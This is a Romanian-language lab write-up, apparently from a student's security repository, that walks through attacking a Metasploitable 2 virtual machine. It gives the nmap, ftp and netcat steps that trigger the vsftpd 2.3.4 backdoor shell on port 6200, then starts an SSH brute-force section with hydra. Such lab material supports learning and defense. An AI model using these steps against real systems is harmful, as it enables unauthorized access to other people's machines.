### Atac FTP:

   - [Despre FTP](https://github.com/Dani780-C/Cyber-security/blob/main/learn/_ftp.md)
   - [Captura traficului pentru serviciului FTP in timpul atacului](https://github.com/Dani780-C/Cyber-security/blob/main/captures/ftp-traffic.pcapng)
   - versiune: *vsftpd 2.3.4*
   [In 2011, in arhiva de pe site-ul oficial al serviciului FTP a fost atasat un virus backdoor care executa un shell pe portul 6200. Pentru a executa virusul, username-ul folosit la conectarea serviciului FTP putea fi oricare sir de caractere urmat de un ":)"]

   - Pasii atacului:
      
         nmap -sSV 192.168.56.102 -p21,6200
     ##### Explicatii comanda:
        ```
        nmap <-> tool pentru a scana servicii
        -sSV <-> Stealth scan version
        192.168.56.102 <-> adresa IP a tintei (Metaplsoitable 2)
        -p21,6200 <-> scanam doar porturile 21 si 6200
        ```
     ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-nmap-1.png)

     Se poate observa ca portul 6200 inca nu este deschis.
     
         ftp 192.168.56.102 21
     
     ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-2.png)
     
         nmap 192.168.56.102 -p6200
         
     ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-nmap-2.png)
     
     Se poate vedea dupa o inca scanare a portului 6200 ca acum este deschis.
     
         nc -v 192.168.56.102 6200
         
      ##### Explicatii comanda:
        ```
        nc <-> netcat
        -v <-> verbose
        192.168.56.102 <-> adresa IP a tintei
        6200 <-> portul pe care ne conectam
        ```     
      ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-done.png)
     
### Atac SSH:

   - [Despre SSH](https://github.com/Dani780-C/Cyber-security/blob/main/learn/_ssh.md)
   - [Captura traficului pentru serviciului SSH in timpul atacului](https://github.com/Dani780-C/Cyber-security/blob/main/captures/ftp-traffic.pcapng)
   - versiune: *OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)*
   - Pasii atacului:
         
         nmap -sSV 192.168.56.102 -p22
     ##### Explicatii comanda:
        ```
        nmap <-> tool pentru a scana servicii
        -sSV <-> Stealth scan version
        192.168.56.102 <-> adresa IP a tintei (Metaplsoitable 2)
        -p22 <-> scanam doar portul 22
        ```
     ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/nmap-ssh-p22.png)
     
     Pentru atacul asupra serviciului SSH am folosit metoda brute-force cu ajutorul tool-ului [hydra](https://github.com/Dani780-C/Cyber-security/blob/main/tools/hydra.md).
     
